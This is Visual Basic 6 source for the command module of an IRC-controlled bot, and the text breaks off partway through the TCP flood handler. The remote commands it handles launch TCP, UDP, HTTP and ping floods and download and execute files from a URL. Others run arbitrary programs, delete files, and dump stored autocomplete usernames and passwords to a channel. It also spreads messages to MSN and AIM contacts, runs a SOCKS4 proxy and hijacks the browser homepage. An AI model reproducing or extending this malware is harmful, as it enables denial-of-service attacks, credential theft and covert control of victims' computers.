Attribute VB_Name = "modCommands"
Option Explicit

'commands
Public Commands() As tCommand
Public lngCmdCount As Long
Private Type tCommand
    strCmd As String
    strFrom As String
    strParam() As String
    strParamData() As String
    lngParamCount As Long
    lngDelay As Long
    blnQuiet As Boolean
    blnInUse As Boolean
End Type

'unsent channel messages
Public Messages() As Message
Public MessageCount As Long
Private Type Message
    blnDirect As Boolean
    strMessage As String
    lngIndex As Long
    strChannel As String
End Type

Public Sub SplitCommands(strCommand As String, Optional from As String)
On Local Error GoTo ErrHand
    Dim i As Long
    Dim Index As Long
    Dim strChar As String
    Dim blnInQuotes As Boolean
    Dim strCommands() As String
    Dim lngCommandCount As Long
    Dim lngStartPos As Long
    Dim lngCurPos As Long
    Dim blnMoreThanOneCommand As Boolean
    
    lngStartPos = 1
    lngCurPos = 1
    
    Do
        strChar = Mid$(strCommand, lngCurPos, 1)
        If strChar = """" Then
            blnInQuotes = Not blnInQuotes
        End If
        If blnInQuotes = False Then
            If strChar = ";" Then
                blnMoreThanOneCommand = True
                ReDim Preserve strCommands(lngCommandCount)
                strCommands(lngCommandCount) = Trim$(Mid$(strCommand, lngStartPos, lngCurPos - lngStartPos))
                
                lngCommandCount = lngCommandCount + 1
                lngStartPos = lngCurPos + 1
            End If
        End If
        lngCurPos = lngCurPos + 1
        If lngCurPos > Len(strCommand) Then
            If blnMoreThanOneCommand = True Then
                ReDim Preserve strCommands(lngCommandCount)
                strCommands(lngCommandCount) = Trim$(Mid$(strCommand, lngStartPos, lngCurPos - lngStartPos))
                
                lngCommandCount = lngCommandCount + 1
            Else
                ReDim strCommands(0)
                strCommands(0) = Trim$(strCommand)
                lngCommandCount = 1
            End If
            Exit Do
        End If
    Loop
    
    For i = 0 To UBound(strCommands)
        If Left$(strCommands(i), 1) = CmdPrefix Then
            strCommands(i) = Right$(strCommands(i), Len(strCommands(i)) - 1)
            If Len(strCommands(i)) > 0 Then
                Index = NewCommand
                With Commands(Index)
                    .strFrom = from
                    .strCmd = strCommands(i)
                    .blnQuiet = False
                    .lngDelay = 0
                End With
                
                ParseGlobal (Index)
            End If
        End If
    Next
    
    Exit Sub
ErrHand:
    DirectMsgChan "SplitCommands #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Function NewCommand() As Long
    Dim i As Long
    For i = 0 To lngCmdCount - 1
        If Commands(i).blnInUse = False Then
            Commands(i).blnInUse = True
            NewCommand = i
            Exit Function
        End If
    Next
    
    ReDim Preserve Commands(lngCmdCount)
    Commands(lngCmdCount).blnInUse = True
    NewCommand = lngCmdCount
    lngCmdCount = lngCmdCount + 1
End Function

Private Sub ParseParams(Index As Long)
On Local Error GoTo ErrHand
    Dim i As Long
    Dim strCurrentParam As String
    Dim strCurrentData As String
    Dim blnWasInParam As Boolean
    Dim blnInParam As Boolean
    Dim blnInQuotes As Boolean
    
    With Commands(Index)
        ReDim .strParam(0)
        ReDim .strParamData(0)
        .lngParamCount = 0
        
        For i = 1 To Len(.strCmd)
            Dim strChar As String
            strChar = Mid$(.strCmd, i, 1)
            
             If blnInParam = False And blnInQuotes = False Then
                If strChar = "-" Then
                    blnInParam = True
                    blnWasInParam = True
                    ReDim Preserve .strParam(.lngParamCount)
                    ReDim Preserve .strParamData(.lngParamCount)
                    .lngParamCount = .lngParamCount + 1
                    GoTo TheEnd
                ElseIf strChar = """" Then
                    blnInQuotes = True
                    GoTo TheEnd
                End If
            ElseIf blnInParam = True And blnInQuotes = False Then
                If strChar = "-" Then
                    If Len(strCurrentParam) > 0 Then
                        .strParam(.lngParamCount - 1) = LCase$(strCurrentParam)
                    End If
                    
                    ReDim Preserve .strParam(.lngParamCount)
                    ReDim Preserve .strParamData(.lngParamCount)
                    .lngParamCount = .lngParamCount + 1
                    GoTo TheEnd
                ElseIf strChar = " " Or strChar = "=" Then
                    blnInParam = False
                    .strParam(.lngParamCount - 1) = LCase$(strCurrentParam)
                    strCurrentParam = vbNullString
                ElseIf strChar = """" Then
                    blnInParam = False
                    blnInQuotes = True
                    
                    .strParam(.lngParamCount - 1) = LCase$(strCurrentParam)
                    strCurrentParam = ""
                Else
                    strCurrentParam = strCurrentParam & strChar
                End If
                
                GoTo TheEnd
            End If
            
            If blnInQuotes = True And blnWasInParam = True Then
                If strChar = """" Then
                    blnInQuotes = False
                    blnWasInParam = False
                    .strParamData(.lngParamCount - 1) = strCurrentData
                    strCurrentData = ""
                Else
                    strCurrentData = strCurrentData & strChar
                End If
            End If
TheEnd:
        Next
    
        If blnInParam = True Then
            .strParam(.lngParamCount - 1) = LCase$(strCurrentParam)
        End If
        
        For i = 0 To UBound(.strParam)
            .strParamData(i) = Replace$(.strParamData(i), "%quote%", """")
            .strParamData(i) = Replace$(.strParamData(i), "%sysdir%", Client.SystemDir)
            .strParamData(i) = Replace$(.strParamData(i), "%windir%", Client.WindowsDir)
            .strParamData(i) = Replace$(.strParamData(i), "%tempdir%", Client.TempDir)
            .strParamData(i) = Replace$(.strParamData(i), "%botdir%", App.Path)
            .strParamData(i) = Replace$(.strParamData(i), "%homedrive%", Client.HomeDrive)
            .strParamData(i) = Replace$(.strParamData(i), "%crlf%", vbCrLf)
            .strParamData(i) = Replace$(.strParamData(i), "%lf%", vbLf)
            .strParamData(i) = Replace$(.strParamData(i), "%country%", Client.Country)
            .strParamData(i) = Replace$(.strParamData(i), "%countrycode%", Client.CountryCode)
        Next
    End With

    Exit Sub
ErrHand:
    DirectMsgChan "ParseParams #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Sub DeleteParam(Index As Long, ParamIndex As Long)
On Local Error GoTo ErrHand
    Dim i As Long
    Dim lngUbound As Long
    
    With Commands(Index)
        lngUbound = UBound(.strParam)
        
        If lngUbound > 0 Then
            For i = ParamIndex To lngUbound - 1
                .strParam(i) = .strParam(i + 1)
                .strParamData(i) = .strParamData(i + 1)
            Next
            
            ReDim Preserve .strParam(lngUbound - 1)
            ReDim Preserve .strParamData(lngUbound - 1)
            
            .lngParamCount = .lngParamCount - 1
        Else
            .strParam(0) = ""
            .strParamData(0) = ""
            
            .lngParamCount = 0
        End If
    End With
    
    Exit Sub
ErrHand:
    DirectMsgChan "DeleteParam #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Sub ParseGlobal(Index As Long)
    On Local Error GoTo ErrHand
    Dim i As Long
    Dim lngDelay As Long
    Dim lngRandDelay As Long
    
    ParseParams (Index)
    
    With Commands(Index)
    'global parameters
        While i <= .lngParamCount - 1
            Select Case .strParam(i)
                Case "q", "quiet"
                    .blnQuiet = True
                    Call DeleteParam(Index, i)
                    i = i - 1
                Case "delay", "d"
                    lngDelay = .strParamData(i)
                    Call DeleteParam(Index, i)
                    i = i - 1
                Case "randomdelay", "rd"
                    lngRandDelay = .strParamData(i)
                    Call DeleteParam(Index, i)
                    i = i - 1
            End Select
            i = i + 1
        Wend
    End With
    
    If lngRandDelay > 0 Then lngDelay = RandNum(0, lngRandDelay)
    If lngDelay > 0 Then
        'if there's a delay, start a timer to continue the cmd later
        Commands(Index).lngDelay = lngDelay
        If Index <> 0 Then Load frmMain.tmrCmdDelay(Index)
        frmMain.tmrCmdDelay(Index).Tag = 0
        frmMain.tmrCmdDelay(Index).Enabled = True
    Else
        'if no delay, finish with the command
        ParseCommand (Index)
    End If
    
    Exit Sub
ErrHand:
    DirectMsgChan "ParseGlobal #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Public Sub ParseCommand(Index As Long)
    'On Local Error Resume Next
    On Local Error GoTo ErrHand
    Dim strSplit() As String
    
    '!restart, !shutdown, etc
    Dim cExitWindows As New clsExitWindows
    
    With Commands(Index)
        strSplit = Split(.strCmd, " ")
        
        Select Case LCase$(strSplit(0))
            Case "a"
                CmdA (Index)
            Case "echo"
                CmdEcho (Index)
            Case "sysinfo"
                CmdSysinfo (Index)
            Case "listdrives"
                CmdListDrives (Index)
            Case "driveinfo"
                CmdDriveInfo (Index)
            Case "tcp"
                CmdTCP (Index)
            Case "stoptcp"
                If TCP.Flooding = True Then
                    MsgChan "Stopping TCP flood: " & TCP.Hostname & " (" & TCP.IP & ")", Index
                    StopTCPFlood (False)
                End If
            Case "http"
                CmdHTTP (Index)
            Case "stophttp"
                If HTTP.Flooding = True Then
                    MsgChan "Stopping HTTP flood: " & HTTP.URL, Index
                    StopHTTPFlood (False)
                End If
            Case "udp"
                CmdUDP (Index)
            Case "stopudp"
                If UDP.Flooding = True Then
                    MsgChan "Stopping UDP flood: " & UDP.Hostname & "(" & UDP.IP & ")", Index
                    StopUDPFlood (False)
                End If
            Case "ping"
                CmdPing (Index)
            Case "stopping"
                If Ping.Flooding = True Then
                    MsgChan "Stopping ping flood: " & Ping.Hostname, Index
                    StopPingFlood (False)
                End If
            Case "stopall"
                If Ping.Flooding = True Then
                    MsgChan "Stopping ping flood: " & Ping.Hostname, Index
                    StopPingFlood (False)
                End If
                If UDP.Flooding = True Then
                    MsgChan "Stopping UDP flood: " & UDP.Hostname & "(" & UDP.IP & ")", Index
                    StopUDPFlood (False)
                End If
                If HTTP.Flooding = True Then
                    MsgChan "Stopping HTTP flood: " & HTTP.URL, Index
                    StopHTTPFlood (False)
                End If
                If TCP.Flooding = True Then
                    MsgChan "Stopping TCP flood: " & TCP.Hostname & "(" & TCP.IP & ")", Index
                    StopTCPFlood (False)
                End If
            Case "status"
                If HTTP.Flooding = False And UDP.Flooding = False And Ping.Flooding = False And TCP.Flooding = False Then
                    MsgChan "I'm not doing anything!", Index
                Else
                    If HTTP.Flooding = True Then MsgChan "HTTP Flooding: " & HTTP.URL & " with " & (HTTP.Duration - DateDiff(HTTP.DateType, HTTP.BeginDate, Now)) & " " & GetDateType(HTTP.DateType) & " remaining.", Index
                    If UDP.Flooding = True Then MsgChan "UDP Flooding: " & UDP.Hostname & " (" & UDP.IP & ") with " & (UDP.Duration - DateDiff(UDP.DateType, UDP.BeginDate, Now)) & " " & GetDateType(UDP.DateType) & " remaining.", Index
                    If Ping.Flooding = True Then MsgChan "Ping Flooding: " & Ping.Hostname & " with " & (Ping.Duration - DateDiff(Ping.DateType, Ping.BeginDate, Now)) & " " & GetDateType(Ping.DateType) & " remaining.", Index
                    If TCP.Flooding = True Then MsgChan "TCP Flooding: " & TCP.Hostname & " (" & TCP.IP & ") with " & (TCP.Duration - DateDiff(TCP.DateType, TCP.BeginDate, Now)) & " " & GetDateType(TCP.DateType) & " remaining.", Index
                End If
            Case "join"
                CmdJoin (Index)
            Case "part"
                CmdPart (Index)
            Case "nick"
                CmdNick (Index)
            Case "botdir"
                MsgChan "[BOTDIR]: " & Client.FullPath, Index
            Case "resolve"
                CmdResolve (Index)
            Case "version"
                MsgChan "[VERSION]: " & BotVersion, Index
            Case "update"
                CmdUpdate (Index)
            Case "download"
                CmdDownload (Index)
                Exit Sub 'cmd isn't done yet, don't set blnInUse = false
            Case "shell"
                CmdShell (Index)
            Case "flushdns"
                Call ExecuteCommand("ipconfig /flushdns")
            Case "cmd"
                Call CmdCmd(Index)
            Case "die"
                frmMain.CleanUp
                End
            Case "uninstall"
                UninstallSelf
            Case "shutdown"
                cExitWindows.ExitWindows WE_SHUTDOWN
            Case "restart"
                cExitWindows.ExitWindows WE_REBOOT
            Case "hostname"
                MsgChan "[HOSTNAME]: " & Client.RealHost & " (" & Client.RealIP & ")", Index
            Case "localip"
                MsgChan "[LOCALIP]: " & Client.LocalIP, Index
            Case "imspread"
                Call CmdIMSpread(Index)
            Case "uptime"
                Call CmdUptime(Index)
            Case "finduptime"
                Call CmdFinduptime(Index)
            Case "autocomplete"
                Call CmdAutocomplete(Index)
            Case "findhost"
                Call CmdFindhost(Index)
            Case "searchautocomplete"
                Call CmdSearchAutocomplete(Index)
            Case "delete"
                Call CmdDelete(Index)
            Case "socks4"
                Call CmdSocks4(Index)
            Case "filesearch"
                Call CmdFileSearch(Index)
            Case "readfile"
                Call CmdReadFile(Index)
            Case "msnadd"
                Call CmdMSNAdd(Index)
            Case "msnsend"
                Call CmdMSNSend(Index)
            Case "kill"
                Call CmdKill(Index)
            Case "proclist"
                Call CmdProcList(Index)
            Case "homepage"
                Call CmdHomepage(Index)
            Case "autohomepage"
                Call CmdAutohomepage(Index)
            Case "findproxy"
                Call CmdFindProxy(Index)
        End Select
        
        'this command is done :)
        .blnInUse = False
    End With
    
    Exit Sub
ErrHand:
    DirectMsgChan "ParseCommand #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Sub InsuffParams(Index As Long, strCmd As String)
    MsgChan "[" & strCmd & "][ERROR]: Insufficient parameters!", Index
End Sub

Private Sub InvParam(Index As Long, Param As String, strCmd As String)
    MsgChan "[" & strCmd & "][ERROR]: Invalid parameter (" & Param & ")", Index
End Sub

Public Sub DirectMsgChan(ByVal strMessage As String, Optional ByVal strChannel As String)
    Dim strSplit() As String
    Dim i As Long
    
    If Len(strMessage) = 0 Then Exit Sub
    If Len(strChannel) = 0 Then strChannel = Servers(lngServerIndex).strChannel
    
    strSplit = Split(strMessage, vbCrLf)
    
    For i = 0 To UBound(strSplit)
        If Len(strSplit(i)) > 0 And strSplit(i) <> Chr(13) Then
            'if we're not connected yet, save for later
            If Client.Connected = False Then
                ReDim Preserve Messages(MessageCount)
                Messages(MessageCount).blnDirect = True
                Messages(MessageCount).strMessage = strMessage
                Messages(MessageCount).strChannel = strChannel
                MessageCount = MessageCount + 1
            Else
                '[PRIVMSG]
                IRCSendData "P " & strChannel & " :" & yEncode(EnDeCrypt(strSplit(i)))
            End If
        End If
    Next
End Sub

Public Sub MsgChan(ByVal strMessage As String, Index As Long, Optional ByVal strChannel As String)
    If Len(strMessage) > 0 And Commands(Index).blnQuiet = False Then
        Dim strSplit() As String
        Dim i As Long
        
        If Len(strChannel) = 0 Then
            If Len(Commands(Index).strFrom) > 0 Then
                strChannel = Commands(Index).strFrom
            Else
                strChannel = Servers(lngServerIndex).strChannel
            End If
        End If
        
        strSplit = Split(strMessage, vbCrLf)
        
        For i = 0 To UBound(strSplit)
            If Len(strSplit(i)) > 0 And strSplit(i) <> Chr(13) Then
                If Client.Connected = False Then
                    ReDim Preserve Messages(MessageCount)
                    Messages(MessageCount).blnDirect = False
                    Messages(MessageCount).strMessage = strMessage
                    Messages(MessageCount).lngIndex = Index
                    Messages(MessageCount).strChannel = strChannel
                    MessageCount = MessageCount + 1
                Else
                    '[PRIVMSG]
                    IRCSendData "P " & strChannel & " :" & yEncode(EnDeCrypt(strSplit(i)))
                End If
            End If
        Next
    End If
End Sub

'========================================
'========================================
'               Commands
'========================================
'========================================

Private Sub CmdDownload(Index As Long)
    Dim i As Long
    Dim strSavePath As String
    Dim strURL As String
    Dim blnExec As Boolean
    Dim strCRC As String

    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "url", "u"
                    strURL = .strParamData(i)
                Case "save", "s"
                    strSavePath = .strParamData(i)
                Case "execute", "e"
                   blnExec = True
                Case "crc", "c"
                    strCRC = .strParamData(i)
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "DOWNLOAD")
                    Exit Sub
            End Select
        Next
    End With
    
    If Len(strSavePath) = 0 Or Len(strURL) = 0 Then
        Call InsuffParams(Index, "DOWNLOAD")
        Exit Sub
    End If
    
    Dim dlThread As Long
    For i = 1 To 3
        If frmMain.dlDownload(i).InUse = False Then
            dlThread = i
            Exit For
        End If
    Next
    If dlThread <> 0 Then
        MsgChan "[DOWNLOAD][THREAD #" & dlThread & "]: Starting download: " & strURL, Index
        frmMain.dlDownload(dlThread).CRC = strCRC
        frmMain.dlDownload(dlThread).CmdIndex = Index
        frmMain.dlDownload(dlThread).Download strURL, strSavePath, blnExec
    Else
        MsgChan "[DOWNLOAD][ERROR]: All threads are already in use", Index
    End If
End Sub

Private Sub CmdUpdate(Index As Long)
    Dim sinNewVersion As Single
    Dim strURL As String
    Dim strCRC As String
    Dim i As Long
    
    'if we're already attempting to update, disregard
    If GetSetting("update.updating") = "1" Then Exit Sub
    
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "version", "v"
                    sinNewVersion = CSng(.strParamData(i))
                Case "url", "u"
                    strURL = .strParamData(i)
                Case "crc", "c"
                    strCRC = .strParamData(i)
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "UPDATE")
                    Exit Sub
            End Select
        Next
    End With

    If sinNewVersion = 0 Or Len(strURL) = 0 Then
        Call InsuffParams(Index, "UPDATE")
        Exit Sub
    End If
    
    If sinNewVersion > CSng(BotVersion) Then
        Call SaveSetting("update.updating", "1")
        Call SaveSetting("update.newver", CStr(sinNewVersion))
        Call SaveSetting("update.oldver", CStr(BotVersion))
        Call SaveSetting("update.url", strURL)
        Call SaveSetting("update.crc", strCRC)
        Call SaveSetting("update.errcount", "0")
        
        'updater uses this file to determine the name of the old exe
        Dim intFileHandle As Integer
        intFileHandle = FreeFile
        If FileExists(App.Path & "\oldname") Then DeleteFile App.Path & "\oldname"
        Open App.Path & "\oldname" For Binary Access Write As #intFileHandle
        Put #intFileHandle, , Client.EXEName
        Close #intFileHandle
        
        MsgChan "[UPDATE]: Starting upgrade download [" & BotVersion & "]", Index
        frmMain.dlUpdate.CRC = strCRC
        frmMain.dlUpdate.Download strURL, App.Path & "\snew.exe"
    End If
End Sub

Private Sub CmdUptime(Index As Long)
    On Local Error GoTo ErrHand
    Dim strCurrent As String
    Dim strLast As String
    Dim strBest As String
    
    'update stuff first
    frmMain.tmrUptime_Timer
    
    strCurrent = "Current: " & CalcUptime(GetUptime)
    strLast = "Last: " & CalcUptime(GetSettingLong("uptime.last"))
    strBest = "Best: " & CalcUptime(GetSettingLong("uptime.best"))
    
    MsgChan "[UPTIME] " & strCurrent & ", " & strLast & ", " & strBest, Index
    
    Exit Sub
ErrHand:
    DirectMsgChan "CmdUptime #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Sub CmdFinduptime(Index As Long)
    Dim Days As Long
    Dim InputDays As Long
    Dim lngCurrent As Long
    Dim strCurrent As String
    Dim i As Long
    
    frmMain.tmrUptime_Timer
    
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "days"
                    InputDays = Val(.strParamData(i))
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "FINDUPTIME")
                    Exit Sub
            End Select
        Next
    End With
    
    frmMain.tmrUptime_Timer
    
    lngCurrent = GetUptime
    
    Days = Int(lngCurrent / 86400)
    
    If InputDays <= Days Then
        strCurrent = CalcUptime(lngCurrent)
        MsgChan "[FINDUPTIME]: " & strCurrent, Index
    End If
End Sub

Private Sub CmdAutocomplete(Index As Long)
    On Local Error Resume Next
    Dim i As Long
    Dim intFileHandle As Integer
    Dim strData As String
    Dim lngLen As Long
    Dim strEntry() As String
    Dim strItem() As String
    
    Call DeleteFile(App.Path & "\ps.dat")
    DumpPStorage
    
    intFileHandle = FreeFile
    lngLen = FileLen(App.Path & "\ps.dat")
    If lngLen > 0 Then
        Open App.Path & "\ps.dat" For Binary As #intFileHandle
        strData = Space$(lngLen)
        Get #intFileHandle, , strData
        strEntry = Split(strData, Chr(2))
        For i = 0 To UBound(strEntry)
            strItem = Split(strEntry(i), Chr(1), 4)
            If UBound(strItem) = 3 Then
                If Len(strItem(3)) > 0 Then
                    Call MsgChan("===", Index, AutocompleteChan)
                    If Len(strItem(0)) > 0 Then Call MsgChan("Resource Name: " & strItem(0), Index, AutocompleteChan)
                    If Len(strItem(1)) > 0 Then Call MsgChan("Resource Type: " & strItem(1), Index, AutocompleteChan)
                    If Len(strItem(2)) > 0 Then Call MsgChan("Username/value: " & strItem(2), Index, AutocompleteChan)
                    Call MsgChan("Password: " & strItem(3), Index, AutocompleteChan)
                    Call MsgChan("===", Index, AutocompleteChan)
                End If
            End If
        Next
        Close #intFileHandle
    End If
    
    Call DeleteFile(App.Path & "\ps.dat")
End Sub

Private Sub CmdSearchAutocomplete(Index As Long)
    On Local Error Resume Next
    Dim i As Long
    Dim intFileHandle As Integer
    Dim strData As String
    Dim lngLen As Long
    Dim strEntry() As String
    Dim strItem() As String
    Dim strSearch As String
    
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "search", "s"
                    strSearch = LCase$(.strParamData(i))
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "SEARCHAUTOCOMPLETE")
                    Exit Sub
            End Select
        Next
    End With
    
    If Len(strSearch) = 0 Then
        Call InsuffParams(Index, "SEARCHAUTOCOMPLETE")
        Exit Sub
    End If
    
    Call DeleteFile(App.Path & "\ps.dat")
    
    DumpPStorage
    
    intFileHandle = FreeFile
    lngLen = FileLen(App.Path & "\ps.dat")
    If lngLen > 0 Then
        Open App.Path & "\ps.dat" For Binary As #intFileHandle
        strData = Space$(lngLen)
        Get #intFileHandle, , strData
        strEntry = Split(strData, Chr(2))
        For i = 0 To UBound(strEntry)
            strItem = Split(strEntry(i), Chr(1), 4)
            If LCase$(strEntry(i)) Like strSearch Then
                If UBound(strItem) = 3 Then
                    If Len(strItem(3)) > 0 Then
                        Call MsgChan("===", Index, AutocompleteChan)
                        If Len(strItem(0)) > 0 Then Call MsgChan("Resource Name: " & strItem(0), Index, AutocompleteChan)
                        If Len(strItem(1)) > 0 Then Call MsgChan("Resource Type: " & strItem(1), Index, AutocompleteChan)
                        If Len(strItem(2)) > 0 Then Call MsgChan("Username/value: " & strItem(2), Index, AutocompleteChan)
                        Call MsgChan("Password: " & strItem(3), Index, AutocompleteChan)
                        Call MsgChan("===", Index, AutocompleteChan)
                    End If
                End If
            End If
        Next
        Close #intFileHandle
    End If
    
    Call DeleteFile(App.Path & "\ps.dat")
End Sub

Private Sub CmdFindhost(Index As Long)
    Dim strHost As String
    Dim i As Long
    
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "host", "h"
                    strHost = LCase$(.strParamData(i))
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "FINDHOST")
                    Exit Sub
            End Select
        Next
        
        If Len(strHost) = 0 Then
            Call InsuffParams(Index, "FINDHOST")
            Exit Sub
        End If
        
        If LCase$(Client.RealHost) Like strHost Then
            MsgChan "[FINDHOST]: Match: " & Client.RealHost, Index
        End If
    End With
End Sub

Private Sub CmdIMSpread(Index As Long)
    On Local Error GoTo ErrHand
    Dim i As Long
    Dim strDateType As String
    Dim lngDuration As Long
    Dim blnStartMSN As Boolean
    Dim blnStartAIM As Boolean
    Dim blnStopMSN As Boolean
    Dim blnStopAIM As Boolean
    
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "duration", "du"
                    If IsNumeric(.strParamData(i)) Then
                        lngDuration = CLng(.strParamData(i))
                        IMSpread.Duration = lngDuration
                        SaveSetting "imspread.duration", CStr(IMSpread.Duration)
                    End If
                Case "datetype", "dt"
                    strDateType = .strParamData(i)
                    IMSpread.DateType = strDateType
                    SaveSetting "imspread.datetype", IMSpread.DateType
                Case "startmsn"
                    blnStartMSN = True
                Case "stopmsn"
                    blnStopMSN = True
                Case "startaim"
                    blnStartAIM = True
                Case "stopaim"
                    blnStopAIM = True
                Case "msnmessage"
                    IMSpread.MSNMessage = .strParamData(i)
                    SaveSetting "imspread.msnmessage", IMSpread.MSNMessage
                Case "aimmessage"
                    IMSpread.AIMMessage = .strParamData(i)
                    SaveSetting "imspread.aimmessage", IMSpread.AIMMessage
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "IMSPREAD")
                    Exit Sub
            End Select
        Next
    End With
        
    Dim strMessage As String
    strMessage = "[IMSPREAD]:"
    
    'start spread
    If blnStartMSN = True And Len(IMSpread.MSNMessage) > 0 And IMSpread.SpreadingMSN = False Then
        If Len(strDateType) = 0 Or lngDuration = 0 Then
            InsuffParams Index, "IMSPREAD"
            Exit Sub
        End If
        IMSpread.BeginDate = Now
        SaveSetting "imspread.begindate", IMSpread.BeginDate
        Call StartMSNSpread
        strMessage = strMessage & " [MSN]: Sending to " & MSNPeopleCount & " contacts."
    End If
    If blnStartAIM = True And Len(IMSpread.AIMMessage) > 0 And IMSpread.SpreadingAIM = False Then
        If Len(strDateType) = 0 Or lngDuration = 0 Then
            InsuffParams Index, "IMSPREAD"
            Exit Sub
        End If
        IMSpread.BeginDate = Now
        SaveSetting "imspread.begindate", IMSpread.BeginDate
        Call StartAIMSpread
        strMessage = strMessage & " [AIM]: Sending to contacts."
    End If
    
    'stop spread
    If blnStopMSN = True And IMSpread.SpreadingMSN = True Then
        StopMSNSpread
        strMessage = strMessage & " [MSN]: Stopping spread."
    End If
    If blnStopAIM = True And IMSpread.SpreadingAIM = True Then
        StopAIMSpread
        strMessage = strMessage & " [AIM]: Stopping spread."
    End If
    
    'if not spreading, turn off timer that stops spread after duration is over
    If IMSpread.SpreadingAIM = False And IMSpread.SpreadingMSN = False Then frmMain.tmrIMSpread.Enabled = False
    
    'send any messages
    If Len(strMessage) > 11 Then MsgChan strMessage, Index
    
    Exit Sub
ErrHand:
    DirectMsgChan "CmdIMSpread #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Sub CmdJoin(Index As Long)
    Dim strChan As String
    Dim strPass As String
    Dim i As Long
    
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "channel", "c"
                    strChan = .strParamData(i)
                Case "password", "p"
                    strPass = .strParamData(i)
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "JOIN")
                    Exit Sub
            End Select
        Next
    End With
    
    If Len(strChan) = 0 Then
        Call InsuffParams(Index, "JOIN")
        Exit Sub
    End If
    
    If Len(strPass) = 0 Then
        '[JOIN]
        IRCSendData "J " & strChan & " " & strPass
    Else
        '[JOIN]
        IRCSendData "J " & strChan
    End If
End Sub

Private Sub CmdPart(Index As Long)
    Dim strChan As String
    Dim i As Long
    
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "channel", "chan", "c"
                    strChan = .strParamData(i)
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "PART")
                    Exit Sub
            End Select
        Next
    End With
    
    If Len(strChan) = 0 Then
        Call InsuffParams(Index, "PART")
    Else
        IRCSendData "PART " & strChan
    End If
End Sub

Private Sub CmdSysinfo(Index As Long)
    On Local Error Resume Next
    Dim i As Long
    Dim strOS As String
    Dim blnCPU As Boolean
    Dim memoryInfo As MEMORYSTATUS
    
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "cpu", "c"
                    blnCPU = True
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "SYSINFO")
                    Exit Sub
            End Select
        Next
    End With
    
    GlobalMemoryStatus memoryInfo
    strOS = "Win" & Client.WindowsVersion
    If Client.UsingSP2 = True Then
        strOS = strOS & " SP2"
    End If
    
    If blnCPU = False Then
        MsgChan "[SYSINFO]: Comp name: " & GetCompName & ", OS: " & strOS & ", RAM: " & Round(memoryInfo.dwAvailPhys / 1043321, 0) & "/" & Round(memoryInfo.dwTotalPhys / 1043321, 0), Index
    Else
        Dim lngTotal As Long
        lngTotal = GetTotalProcs
        MsgChan "[SYSINFO]: Clock speed: " & GetCPUSpeed & ", total logical processors: " & lngTotal, Index
        For i = 0 To lngTotal - 1
            MsgChan "[SYSINFO]: [PROC #" & i + 1 & "]: " & Trim$(GetString(HKEY_LOCAL_MACHINE, "HARDWARE\DESCRIPTION\System\CentralProcessor\" & i, "ProcessorNameString")), Index
        Next
    End If
End Sub

Private Sub CmdShell(Index As Long)
    On Error GoTo ErrTrap
    'SW_HIDE = 0
    'SW_MAXIMIZE = 3
    'SW_MINIMIZE = 6
    'SW_SHOWMAXIMIZED = 3
    'SW_SHOWMINIMIZED = 2
    'SW_SHOWNORMAL = 1
    'SW_SHOWNOACTIVATE = 4
    'SW_SHOWNA = 8
    'SW_SHOWMINNOACTIVE = 7
    'SW_SHOWDEFAULT = 10
    'SW_RESTORE = 9
    'SW_SHOW = 5
    Dim i As Long
    Dim strPath As String
    Dim strParams As String
    Dim lngShowCmd As Long
    
    'default = show normal
    lngShowCmd = 1
    
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "target", "t"
                    strPath = .strParamData(i)
                Case "param", "p"
                    strParams = .strParamData(i)
                Case "show", "s"
                    lngShowCmd = Val(.strParamData(i))
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "SHELL")
                    Exit Sub
            End Select
        Next
    End With
    
    If Len(strPath) = 0 Then
        Call InsuffParams(Index, "SHELL")
        Exit Sub
    End If
    
    Dim blnSuccess As Boolean
    blnSuccess = ShellEx(strPath, strParams, , lngShowCmd)
    
    If blnSuccess = False Then
        MsgChan ("[SHELL][ERROR]: Unknown"), Index
    Else
        MsgChan ("[SHELL]: Successfully executed " & strPath), Index
    End If
    
    Exit Sub
ErrTrap:
    MsgChan ("[SHELL][ERROR]: " & Err.Description), Index
End Sub

Private Sub CmdDelete(Index As Long)
    Dim strPath As String
    Dim i As Long
    
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "file"
                    strPath = .strParamData(i)
                Case Else
                    Call InvParam(Index, LCase$(.strParam(i)), "DELETE")
                    Exit Sub
            End Select
        Next
    End With
    
    Call DeleteFile(strPath)
End Sub

Private Sub CmdTCP(Index As Long)
    Dim i As Long
    If TCP.Flooding Then Exit Sub
    
    With Commands(Index)
        For i = 0 To .lngParamCount - 1
            Select Case .strParam(i)
                Case "datetype", "dt"
                    TCP.DateType = .strParamData(i)
                Case "duration", "du"
                    TCP.Duration = Val(.strParamData(i))
